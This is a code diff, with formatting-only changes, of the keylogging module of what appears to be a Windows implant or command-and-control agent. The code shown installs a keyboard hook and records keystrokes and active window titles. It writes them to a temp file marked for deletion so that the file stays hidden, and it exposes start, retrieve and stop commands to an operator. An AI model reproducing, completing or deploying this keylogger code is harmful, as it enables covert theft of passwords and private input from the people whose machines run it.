@@ -11,7 +11,7 @@ recon::create_log_file() {
 
     char	temp_directory[MAX_PATH]   = { 0 };
     char	temp_path[MAX_PATH]        = { 0 };
-    HANDLE  out                        = nullptr;
+    HANDLE      out                        = nullptr;
 
     //--------------------------------------------//
 
@@ -40,12 +40,13 @@ recon::create_log_file() {
     }
 
 
-	FILE_DISPOSITION_INFO dispos = { 0 };
-	dispos.DeleteFile			 = TRUE;
-	if(!SetFileInformationByHandle(out, FileDispositionInfo, &dispos, sizeof(dispos))) {
-		DEBUG_PRINT("[!] Failed to mark log file for deletion: %lu\n", GetLastError());
-		return nullptr;
-	}
+    FILE_DISPOSITION_INFO dispos = { 0 };
+    dispos.DeleteFile = TRUE;
+	
+    if(!SetFileInformationByHandle(out, FileDispositionInfo, &dispos, sizeof(dispos))) {
+	DEBUG_PRINT("[!] Failed to mark log file for deletion: %lu\n", GetLastError());
+	return nullptr;
+    }
 
     return out;
 }
@@ -56,7 +57,7 @@ recon::interact_with_log_file(std::string &buffer, const keylog_action action) {
 
     static HANDLE   hlogfile        = nullptr;
     static HANDLE   hmutex          = CreateMutexA(nullptr, FALSE, nullptr);
-	static bool		trap			= false;
+    static bool	    trap	    = false;
 
     uint32_t        file_size       = 0;
     uint32_t        transferred     = 0;
@@ -72,15 +73,15 @@ recon::interact_with_log_file(std::string &buffer, const keylog_action action) {
         }
     });
 
-	if(trap && action == keylog_action::START) {
-		trap = false;
-		ReleaseMutex(hmutex);
-		ExitThread(0);
-	}
+    if(trap && action == keylog_action::START) {
+	trap = false;
+	ReleaseMutex(hmutex);
+	ExitThread(0);
+     }
 
-	if(hlogfile == nullptr) {
-		hlogfile = create_log_file();
-	}
+    if(hlogfile == nullptr) {
+	hlogfile = create_log_file();
+    }
 
 
     switch(action) {
@@ -108,10 +109,10 @@ recon::interact_with_log_file(std::string &buffer, const keylog_action action) {
             	return false;
             }
 
-    		li.QuadPart = 0;
-    		if (!SetFilePointerEx(hlogfile, li, nullptr, FILE_END)) {
-    			return false;
-    		}
+    	    li.QuadPart = 0;
+    	    if (!SetFilePointerEx(hlogfile, li, nullptr, FILE_END)) {
+    		return false;
+    	    }
             break;
 
         case keylog_action::START:
@@ -128,9 +129,9 @@ recon::interact_with_log_file(std::string &buffer, const keylog_action action) {
             break;
 
         case keylog_action::STOP:
-    		trap = true;
-    		CloseHandle(hlogfile);
-    		hlogfile = nullptr;
+    	    trap = true;
+    	    CloseHandle(hlogfile);
+    	    hlogfile = nullptr;
             break;
     }
 
@@ -141,12 +142,12 @@ recon::interact_with_log_file(std::string &buffer, const keylog_action action) {
 LRESULT CALLBACK
 recon::keyboard_proc(int ncode, WPARAM wparam, LPARAM lparam) {
 
-    static bool shift_down	= false;
+        static bool shift_down	= false;
 	static bool caps_lock	= false;
-	bool		upcase		= false;
-	HWND		hwindow		= nullptr;
+	bool   upcase		= false;
+	HWND   hwindow		= nullptr;
 
-	static std::string	last_window_title;
+	static std::string		last_window_title;
 	std::string			window_title;
 	std::string			buffer;
 
@@ -228,14 +229,14 @@ recon::keyboard_proc(int ncode, WPARAM wparam, LPARAM lparam) {
 		case VK_LCONTROL:	buffer += "<LCTRL>";	break;
 		case VK_RCONTROL:	buffer += "<RCTRL>";	break;
 		case VK_INSERT:		buffer += "<INSERT>";	break;
-		case VK_END:		buffer += "<END>";		break;
+		case VK_END:		buffer += "<END>";	break;
 		case VK_PRINT:		buffer += "<PRINT>";	break;
-		case VK_DELETE:		buffer += "<DEL>";		break;
-		case VK_BACK:		buffer += "<BK>";		break;
-		case VK_LEFT:		buffer += "<LEFT>";		break;
+		case VK_DELETE:		buffer += "<DEL>";	break;
+		case VK_BACK:		buffer += "<BK>";	break;
+		case VK_LEFT:		buffer += "<LEFT>";	break;
 		case VK_RIGHT:		buffer += "<RIGHT>";	break;
-		case VK_UP:			buffer += "<UP>";		break;
-		case VK_DOWN:		buffer += "<DOWN>";		break;
+		case VK_UP:		buffer += "<UP>"; 	break;
+		case VK_DOWN:		buffer += "<DOWN>";	break;
 		case VK_RETURN:		buffer += "<ENTER>\n";	break;
 		case VK_TAB:		buffer += "<TAB>\t";	break;
 
@@ -335,33 +336,33 @@ recon::keylog(const keylog_action action, std::string &buffer) {
                 return false;
             }
 
-    		hkeylogger_thread = CreateThread(
-				nullptr,
-				0,
-				keylogger_thread_entry,
-				nullptr,
-				0,
-				nullptr
-    		);
+    	    hkeylogger_thread = CreateThread(
+		nullptr,
+		0,
+		keylogger_thread_entry,
+		nullptr,
+		0,
+		nullptr
+    	    );
 
-    		if(hkeylogger_thread == nullptr) {
-				buffer = io::win32_failure("keylog", "CreateThread");
-    			return false;
-    		}
+    	    if(hkeylogger_thread == nullptr) {
+		buffer = io::win32_failure("keylog", "CreateThread");
+    		return false;
+    	    }
 
-			buffer = "successfully started keylogger thread with TID: " + std::to_string(GetThreadId(hkeylogger_thread));
-			break;
+	    buffer = "successfully started keylogger thread with TID: " + std::to_string(GetThreadId(hkeylogger_thread));
+	    break;
 
         case keylog_action::GET:
-        	if(hkeylogger_thread == nullptr) {
-        		buffer = "keylogging has not started.";
-        		return false;
-        	}
+            if(hkeylogger_thread == nullptr) {
+        	buffer = "keylogging has not started.";
+        	return false;
+	    }
 
-        	if(!interact_with_log_file(buffer, keylog_action::GET)) {
-        		buffer = "failed to retrieve logfile output.";
-				return false;
-        	}
+            if(!interact_with_log_file(buffer, keylog_action::GET)) {
+        	buffer = "failed to retrieve logfile output.";
+		return false;
+            }
             break;
 
         case keylog_action::STOP:
@@ -370,19 +371,19 @@ recon::keylog(const keylog_action action, std::string &buffer) {
                 return false;
             }
 
-    		interact_with_log_file(buffer, keylog_action::STOP);
-    		CloseHandle(hkeylogger_thread);
-    		hkeylogger_thread = nullptr;
+    	    interact_with_log_file(buffer, keylog_action::STOP);
+    	    CloseHandle(hkeylogger_thread);
+    	    hkeylogger_thread = nullptr;
 
-    		buffer = "told keylogging thread to exit.";
-    		break;
+    	    buffer = "told keylogging thread to exit.";
+    	    break;
 
         default:
             buffer = "unknown action type.";
             return false;
     }
 
-	return true;
+    return true;
 
 #endif //ifdef BAPHOMET_USE_SLEEPMASK
 }
